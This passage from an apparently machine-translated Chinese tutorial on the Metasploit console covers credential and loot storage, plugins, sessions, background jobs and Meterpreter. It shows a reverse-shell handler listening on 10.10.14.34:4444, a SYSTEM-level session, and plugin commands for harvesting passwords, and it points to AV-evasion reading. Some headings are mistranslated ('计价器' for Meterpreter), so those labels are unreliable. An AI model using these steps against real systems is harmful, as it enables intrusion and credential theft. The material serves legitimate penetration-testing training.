ssh-key:/path/to/id_rsa</span><br><span class="line">   # Add a user and a NonReplayableHash</span><br><span class="line">   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5</span><br><span class="line">   # Add a NonReplayableHash</span><br><span class="line">   creds add hash:d19c32489b870735b5f587d76b934283</span><br><span class="line"></span><br><span class="line">General options</span><br><span class="line">  -h,--help             Show this help information</span><br><span class="line">  -o &lt;file&gt;             Send output to a file in csv/jtr (john the ripper) format.</span><br><span class="line">                        If the file name ends in &#x27;.jtr&#x27;, that format will be used.</span><br><span class="line">                        If file name ends in &#x27;.hcat&#x27;, the hashcat format will be used.</span><br><span class="line">                        CSV by default.</span><br><span class="line">  -d,--delete           Delete one or more credentials</span><br><span class="line"></span><br><span class="line">Filter options for listing</span><br><span class="line">  -P,--password &lt;text&gt;  List passwords that match this text</span><br><span class="line">  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec</span><br><span class="line">  -s &lt;svc names&gt;        List creds matching comma-separated service names</span><br><span class="line">  -u,--user &lt;text&gt;      List users that match this text</span><br><span class="line">  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash</span><br><span class="line">  -O,--origins &lt;IP&gt;     List creds that match these origins</span><br><span class="line">  -R,--rhosts           Set RHOSTS from the results of the search</span><br><span class="line">  -v,--verbose          Don&#x27;t truncate long password hashes</span><br><span class="line"></span><br><span class="line">Examples, John the Ripper hash types:</span><br><span class="line">  Operating Systems (starts with)</span><br><span class="line">    Blowfish ($2a$)   : bf</span><br><span class="line">    BSDi     (_)      : bsdi</span><br><span class="line">    DES               : des,crypt</span><br><span class="line">    MD5      ($1$)    : md5</span><br><span class="line">    SHA256   ($5$)    : sha256,crypt</span><br><span class="line">    SHA512   ($6$)    : sha512,crypt</span><br><span class="line">  Databases</span><br><span class="line">    MSSQL             : mssql</span><br><span class="line">    MSSQL 2005        : mssql05</span><br><span class="line">    MSSQL 2012/2014   : mssql12</span><br><span class="line">    MySQL &lt; 4.1       : mysql</span><br><span class="line">    MySQL &gt;= 4.1      : mysql-sha1</span><br><span class="line">    Oracle            : des,oracle</span><br><span class="line">    Oracle 11         : raw-sha1,oracle11</span><br><span class="line">    Oracle 11 (H type): dynamic_1506</span><br><span class="line">    Oracle 12c        : oracle12c</span><br><span class="line">    Postgres          : postgres,raw-md5</span><br><span class="line"></span><br><span class="line">Examples, listing:</span><br><span class="line">  creds               # Default, returns all credentials</span><br><span class="line">  creds 1.2.3.4/24    # Return credentials with logins in this range</span><br><span class="line">  creds -O 1.2.3.4/24 # Return credentials with origins in this range</span><br><span class="line">  creds -p 22-25,445  # nmap port specification</span><br><span class="line">  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services</span><br><span class="line">  creds -t NTLM       # All NTLM creds</span><br><span class="line">  creds -j md5        # All John the Ripper hash type MD5 creds</span><br><span class="line"></span><br><span class="line">Example, deleting:</span><br><span class="line">  # Delete all SMB credentials</span><br><span class="line">  creds -d -s smb</span><br></pre></td></tr></table></figure><h2 id="抢劫"><a href="#抢劫" class="headerlink" title="抢劫"></a>抢劫</h2><p>该<code>loot</code>命令与上面的命令结合使用，为您提供拥有的服务和用户的一目了然的列表。在这种情况下，战利品指的是来自不同系统类型的哈希转储，即哈希、密码、影子等。</p><h4 id="MSF–-存储战利品"><a href="#MSF–-存储战利品" class="headerlink" title="MSF– 存储战利品"></a>MSF– 存储战利品</h4><p> MSF– 存储战利品</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; loot -h</span><br><span class="line"></span><br><span class="line">Usage: loot [options]</span><br><span class="line"> Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]</span><br><span class="line">  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]</span><br><span class="line">  Del: loot -d [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">  -a,--add          Add loot to the list of addresses, instead of listing</span><br><span class="line">  -d,--delete       Delete *all* loot matching host and type</span><br><span class="line">  -f,--file         File with contents of the loot to add</span><br><span class="line">  -i,--info         Info of the loot to add</span><br><span class="line">  -t &lt;type1,type2&gt;  Search for a list of types</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -S,--search       Search string to filter by</span><br></pre></td></tr></table></figure><h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><p>插件是第三方已经发布的现成软件，并已批准 Metasploit 的创建者将他们的软件集成到框架中。这些可以代表免费使用但功能有限的商业产品<code>Community Edition</code>，或者它们可以是由个人开发的个人项目。</p><p>插件的使用使渗透测试人员的生活更加轻松，将知名软件的功能带入<code>msfconsole</code>Metasploit Pro 环境。以前，我们需要在不同的软件之间循环导入和导出结果，一遍又一遍地设置选项和参数，现在，通过使用插件，msfconsole 会自动将所有内容记录到我们正在使用的数据库以及主机、服务和漏洞一目了然供用户使用。<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin">插件</a>直接与 API 一起工作，可用于操作整个框架。它们可用于自动执行重复性任务、向 中添加新命令<code>msfconsole</code>以及扩展已经很强大的框架。</p><h3 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h3><p>要开始使用插件，我们需要确保它安装在我们机器上的正确目录中。导航到<code>/usr/share/metasploit-framework/plugins</code>，这是每个新安装的默认目录<code>msfconsole</code>，应该向我们展示我们有哪些可用的插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins</span><br><span class="line"></span><br><span class="line">aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb</span><br><span class="line">alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb</span><br><span class="line">auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb</span><br></pre></td></tr></table></figure><p>如果在此处找到该插件，我们可以在内部启动它<code>msfconsole</code>，然后会看到该特定插件的问候输出，表明它已成功加载并可以使用了：</p><h3 id="MSF-加载-Nessus"><a href="#MSF-加载-Nessus" class="headerlink" title="MSF - 加载 Nessus"></a>MSF - 加载 Nessus</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load nessus</span><br><span class="line"></span><br><span class="line">[*] Nessus Bridge for Metasploit</span><br><span class="line">[*] Type nessus_help for a command listing</span><br><span class="line">[*] Successfully loaded Plugin: Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; nessus_help</span><br><span class="line"></span><br><span class="line">Command                     Help Text</span><br><span class="line">-------                     ---------</span><br><span class="line">Generic Commands            </span><br><span class="line">-----------------           -----------------</span><br><span class="line">nessus_connect              Connect to a Nessus server</span><br><span class="line">nessus_logout               Logout from the Nessus server</span><br><span class="line">nessus_login                Login into the connected Nessus server with a different username and </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">nessus_user_del             Delete a Nessus User</span><br><span class="line">nessus_user_passwd          Change Nessus Users Password</span><br><span class="line">                            </span><br><span class="line">Policy Commands             </span><br><span class="line">-----------------           -----------------</span><br><span class="line">nessus_policy_list          List all polciies</span><br><span class="line">nessus_policy_del           Delete a policy</span><br></pre></td></tr></table></figure><p>如果插件安装不正确，我们将在尝试加载时收到以下错误。</p><p> MSF - 加载 Nessus</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load Plugin_That_Does_Not_Exist</span><br><span class="line"></span><br><span class="line">[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb</span><br></pre></td></tr></table></figure><p>要开始使用该插件，请开始在该特定插件的帮助菜单中发出我们可用的命令。每个跨平台集成都为我们提供了一组独特的交互，我们可以在评估期间使用这些交互，因此在使用它们之前仔细阅读每一个交互是很有帮助的，这样可以最大限度地利用它们。</p><h3 id="安装新插件"><a href="#安装新插件" class="headerlink" title="安装新插件"></a>安装新插件</h3><p>Parrot OS 发行版的每次更新都会安装新的、更受欢迎的插件，因为它们由其制造商向公众推出，收集在 Parrot 更新存储库中。<code>/usr/share/metasploit-framework/plugins</code>要安装未包含在发行版新更新中的新自定义插件，我们可以获取制造商页面上提供的 .rb 文件，并将其放置在具有适当权限的文件夹中。</p><p>例如，让我们尝试安装<a href="https://github.com/darkoperator/Metasploit-Plugins.git">DarkOperator 的 Metasploit-Plugins</a>。然后，按照上面的链接，我们得到几个 Ruby ( <code>.rb</code>) 文件，我们可以直接将它们放在上面提到的文件夹中。</p><h3 id="下载-MSF-插件"><a href="#下载-MSF-插件" class="headerlink" title="下载 MSF 插件"></a>下载 MSF 插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins</span><br><span class="line">vnswer77@htb[/htb]$ ls Metasploit-Plugins</span><br><span class="line"></span><br><span class="line">aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb</span><br><span class="line">alias.rb           komand.rb      pentest.rb           thread.rb</span><br><span class="line">auto_add_route.rb  lab.rb         request.rb           token_adduser.rb</span><br><span class="line">beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb</span><br><span class="line">db_credcollect.rb  msfd.rb        sample.rb            twitt.rb</span><br><span class="line">db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb</span><br><span class="line">event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb</span><br><span class="line">ffautoregen.rb     nexpose.rb     socket_logger.rb</span><br><span class="line">growl.rb           openvas.rb     sounds.rb</span><br></pre></td></tr></table></figure><p>这里我们可以以插件<code>pentest.rb</code>为例，复制到<code>/usr/share/metasploit-framework/plugins</code>.</p><h4 id="MSF-将插件复制到-MSF"><a href="#MSF-将插件复制到-MSF" class="headerlink" title="MSF - 将插件复制到 MSF"></a>MSF - 将插件复制到 MSF</h4><p> MSF - 将插件复制到 MSF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb</span><br></pre></td></tr></table></figure><p>然后，<code>msfconsole</code>通过运行命令启动并检查插件的安装<code>load</code>。加载插件后， at<code>help menu</code>会<code>msfconsole</code>自动扩展附加功能。</p><h4 id="MSF-加载插件"><a href="#MSF-加载插件" class="headerlink" title="MSF - 加载插件"></a>MSF - 加载插件</h4><p> MSF - 加载插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; load pentest</span><br><span class="line"></span><br><span class="line">       ___         _          _     ___ _           _</span><br><span class="line">      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _</span><br><span class="line">      |  _/ -_) &#x27; \  _/ -_|_-&lt;  _| |  _/ | || / _` | | &#x27; \ </span><br><span class="line">      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|</span><br><span class="line">                                              |___/</span><br><span class="line">      </span><br><span class="line">Version 1.6</span><br><span class="line">Pentest Plugin loaded.</span><br><span class="line">by Carlos Perez (carlos_perez[at]darkoperator.com)</span><br><span class="line">[*] Successfully loaded plugin: pentest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; help</span><br><span class="line"></span><br><span class="line">Tradecraft Commands</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">    Command          Description</span><br><span class="line">    -------          -----------</span><br><span class="line">    check_footprint  Checks the possible footprint of a post module on a target system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_exploit Commands</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    show_client_side  Show matched client side exploits from data imported from vuln scanners.</span><br><span class="line">    vuln_exploit      Runs exploits based on data imported from vuln scanners.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Discovery Commands</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Command                 Description</span><br><span class="line">    -------                 -----------</span><br><span class="line">    discover_db             Run discovery modules against current hosts in the database.</span><br><span class="line">    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.</span><br><span class="line">    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.</span><br><span class="line">    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Project Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    project       Command for managing projects.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Postauto Commands</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Command             Description</span><br><span class="line">    -------             -----------</span><br><span class="line">    app_creds           Run application password collection modules against specified sessions.</span><br><span class="line">    get_lhost           List local IP addresses that can be used for LHOST.</span><br><span class="line">    multi_cmd           Run shell command against several sessions</span><br><span class="line">    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.</span><br><span class="line">    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.</span><br><span class="line">    multi_post          Run a post module against specified sessions.</span><br><span class="line">    multi_post_rc       Run resource file with post modules and options against specified sessions.</span><br><span class="line">    sys_creds           Run system password collection modules against specified sessions.</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>许多人为 Metasploit 框架编写了许多不同的插件。它们都有特定的目的，在熟悉它们之后可以极大地帮助我们节省时间。查看下面的流行插件列表：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://nmap.org/">nMap（预装）</a></td><td><a href="https://sectools.org/tool/nexpose/">NexPose（预装）</a></td><td><a href="https://www.tenable.com/products/nessus">Nessus（预装）</a></td></tr><tr><td><a href="http://blog.gentilkiwi.com/mimikatz">Mimikatz（预装 V.1）</a></td><td><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi">Stdapi（预装）</a></td><td><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation">电磁炮</a></td></tr><tr><td><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb">私人</a></td><td><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/">隐身（预装）</a></td><td><a href="https://github.com/darkoperator/Metasploit-Plugins">黑暗操作员的</a></td></tr></tbody></table><h3 id="混入"><a href="#混入" class="headerlink" title="混入"></a>混入</h3><p>Metasploit 框架是用面向对象的编程语言 Ruby 编写的。<code>msfconsole</code>这在使用起来非常出色方面起着重要作用。Mixin 是其中一种特性，在实现时，它可以为脚本的创建者和用户提供很大的灵活性。</p><p>Mixin 是充当其他类使用的方法的类，而不必是其他类的父类。因此，将其称为继承而不是包含被认为是不合适的。它们主要用于我们：</p><ol><li>想为一个类提供很多可选的功能。</li><li>想要为多个类使用一个特定的功能。</li></ol><p>大多数 Ruby 编程语言都围绕作为模块的 Mixins 展开。Mixins 的概念是使用 word 实现的<code>include</code>，我们将模块名称作为<code>parameter</code>. <a href="https://en.wikibooks.org/wiki/Metasploit/UsingMixins">我们可以在这里</a>阅读更多关于 mixin 的信息。</p><p>如果我们刚刚开始使用 Metasploit，我们不应该担心 Mixins 的使用或它们对我们评估的影响。然而，这里提到它们是为了说明 Metasploit 的定制会变得多么复杂。</p><h2 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h2><p>MSFconsole 可以同时管理多个模块。这是它为用户提供如此多灵活性的众多原因之一。这是通过使用 来完成的<code>Sessions</code>，它为您部署的所有模块创建专用的控制接口。</p><p>一旦创建了多个会话，我们就可以在它们之间切换并将不同的模块链接到其中一个后台会话以在其上运行或将它们转换为作业。请注意，一旦将会话置于后台，它将继续运行，并且我们与目标主机的连接将持续存在。但是，如果在有效负载运行时出现问题，会话可能会终止，从而导致通信通道中断。</p><h2 id="使用会话"><a href="#使用会话" class="headerlink" title="使用会话"></a>使用会话</h2><p>在 msfconsole 中运行任何可用的漏洞利用或辅助模块时，只要它们形成与目标主机的通信通道，我们就可以将会话置于后台。这可以通过按组合键或在 Meterpreter stages 的情况下<code>[CTRL] + [Z]</code>键入命令来完成。<code>background</code>这将提示我们一条确认消息。接受提示后，我们将返回到 msfconsole 提示符 ( <code>msf6 &gt;</code>) 并立即能够启动不同的模块。</p><h4 id="列出活动会话"><a href="#列出活动会话" class="headerlink" title="列出活动会话"></a>列出活动会话</h4><p>我们可以使用该<code>sessions</code>命令来查看我们当前活动的会话。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec_psh) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)</span><br></pre></td></tr></table></figure><h4 id="与会话交互"><a href="#与会话交互" class="headerlink" title="与会话交互"></a>与会话交互</h4><p>您可以使用该<code>sessions -i [no.]</code>命令打开特定会话。</p><p> 与会话交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>当我们想在一个已经被利用的系统上运行一个额外的模块时，这特别有用，该系统具有形成的、稳定的通信通道。</p><p>这可以通过后台处理我们当前的会话来完成，该会话是由于第一个漏洞利用的成功而形成的，搜索我们希望运行的第二个模块，并且，如果所选模块的类型可能，选择会话号该模块应该运行。这可以从第二个模块的菜单中完成<code>show options</code>。</p><p>通常，这些模块可以在类别中找到<code>post</code>，指的是 Post-Exploitation 模块。此类别中的主要模块原型包括凭据收集器、本地漏洞利用建议器和内部网络扫描器。</p><hr><h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>例如，如果我们在特定端口下运行主动攻击并且需要此端口用于不同的模块，我们不能简单地使用终止会话<code>[CTRL] + [C]</code>。如果我们这样做，我们会看到该端口仍在使用中，影响我们对新模块的使用。因此，我们需要使用<code>jobs</code>命令来查看当前在后台运行的活动任务并终止旧任务以释放端口。</p><p>会话中的其他类型的任务也可以转换为作业以在后台无缝运行，即使会话终止或消失也是如此。</p><h4 id="查看作业命令帮助菜单"><a href="#查看作业命令帮助菜单" class="headerlink" title="查看作业命令帮助菜单"></a>查看作业命令帮助菜单</h4><p>我们可以通过键入 来查看此命令的帮助菜单，就像其他命令一样<code>jobs -h</code>。</p><p> 查看作业命令帮助菜单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; jobs -h</span><br><span class="line">Usage: jobs [options]</span><br><span class="line"></span><br><span class="line">Active job manipulation and interaction.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -K        Terminate all running jobs.</span><br><span class="line">    -P        Persist all running jobs on restart.</span><br><span class="line">    -S &lt;opt&gt;  Row search filter.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Lists detailed information about a running job.</span><br><span class="line">    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.</span><br><span class="line">    -l        List all running jobs.</span><br><span class="line">    -p &lt;opt&gt;  Add persistence to job by job ID</span><br><span class="line">    -v        Print more detailed info.  Use with -i and -l</span><br></pre></td></tr></table></figure><h4 id="查看漏洞利用命令帮助菜单"><a href="#查看漏洞利用命令帮助菜单" class="headerlink" title="查看漏洞利用命令帮助菜单"></a>查看漏洞利用命令帮助菜单</h4><p>当我们运行 exploit 时，我们可以通过键入<code>exploit -j</code>. 根据命令的帮助菜单<code>exploit</code>，添加<code>-j</code>到我们的命令中。而不仅仅是<code>exploit</code>or <code>run</code>，将“在作业的上下文中运行它”。</p><p> 查看漏洞利用命令帮助菜单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit -h</span><br><span class="line">Usage: exploit [options]</span><br><span class="line"></span><br><span class="line">Launches an exploitation attempt.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -J        Force running in the foreground, even if passive.</span><br><span class="line">    -e &lt;opt&gt;  The payload encoder to use.  If none is specified, ENCODER is used.</span><br><span class="line">    -f        Force the exploit to run regardless of the value of MinimumRank.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -j        Run in the context of a job.</span><br><span class="line"></span><br><span class="line">&lt;SNIP</span><br></pre></td></tr></table></figure><h4 id="将漏洞作为后台作业运行"><a href="#将漏洞作为后台作业运行" class="headerlink" title="将漏洞作为后台作业运行"></a>将漏洞作为后台作业运行</h4><p> 将漏洞作为后台作业运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.34:4444</span><br></pre></td></tr></table></figure><h4 id="列出正在运行的作业"><a href="#列出正在运行的作业" class="headerlink" title="列出正在运行的作业"></a>列出正在运行的作业</h4><p>要列出所有正在运行的作业，我们可以使用<code>jobs -l</code>命令。要杀死特定的工作，请查看索引号。作业并使用<code>kill [index no.]</code>命令。使用该<code>jobs -K</code>命令终止所有正在运行的作业。</p><p> 列出正在运行的作业</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; jobs -l</span><br><span class="line"></span><br><span class="line">Jobs</span><br><span class="line">====</span><br><span class="line"></span><br><span class="line"> Id  Name                    Payload                    Payload opts</span><br><span class="line"> --  ----                    -------                    ------------</span><br><span class="line"> 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444</span><br></pre></td></tr></table></figure><p>接下来，我们将使用极其强大的<code>Meterpreter</code>有效负载。</p><h1 id="计价器"><a href="#计价器" class="headerlink" title="计价器"></a>计价器</h1><hr><p>Payload<code>Meterpreter</code>是一种特定类型的多方面、可扩展的 Payload，用于<code>DLL injection</code>确保与受害主机的连接稳定且难以使用简单检查进行检测，并且可以配置为在重启或系统更改时保持不变。此外，Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。</p><p>它被称为渗透测试的瑞士军刀，这是有充分理由的。Meterpreter 的目的是专门改进我们的后开发程序，为我们提供一组精心挑选的相关工具，以便从内部更直接地枚举目标主机。它可以帮助我们找到各种特权升级技术、AV 规避技术、进一步的漏洞研究、提供持久访问、枢轴等。</p><p>对于一些有趣的阅读，请查看这篇关于Meterpreter 无阶段有效载荷的<a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">文章和这篇关于修改 Metasploit 模板以进行规避的</a><a href="https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion">文章</a>。这些主题超出了本模块的范围，但我们应该意识到这些可能性。</p><hr><h2 id="运行-Meterpreter"><a href="#运行-Meterpreter" class="headerlink" title="运行 Meterpreter"></a>运行 Meterpreter</h2><p>要运行 Meterpreter，我们只需要从输出中选择它的任何版本<code>show payloads</code>，同时考虑到我们正在攻击的连接类型和操作系统。</p><p>漏洞利用完成后，会发生以下事件：</p><ul><li>目标执行初始阶段。这通常是 bind、reverse、findtag、passivex 等。</li><li>stager 加载以 Reflective 为前缀的 DLL。反射存根处理 DLL 的加载&#x2F;注入。</li><li>Meterpreter 核心初始化，通过套接字建立 AES 加密链接，并发送 GET。Metasploit 收到此 GET 并配置客户端。</li><li>最后，Meterpreter 加载扩展。如果模块授予管理权限，它将始终加载<code>stdapi</code>和加载。<code>priv</code>所有这些扩展都是通过 AES 加密加载的。</li></ul><p>每当 Meterpreter Payload 被发送并在目标系统上运行时，我们都会收到一个<code>Meterpreter shell</code>. 然后我们可以立即发出<code>help</code>命令来查看 Meterpreter shell 的功能。</p><h4 id="MSF-Meterpreter-命令-1"><a href="#MSF-Meterpreter-命令-1" class="headerlink" title="MSF - Meterpreter 命令"></a>MSF - Meterpreter 命令</h4><p> MSF - Meterpreter 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 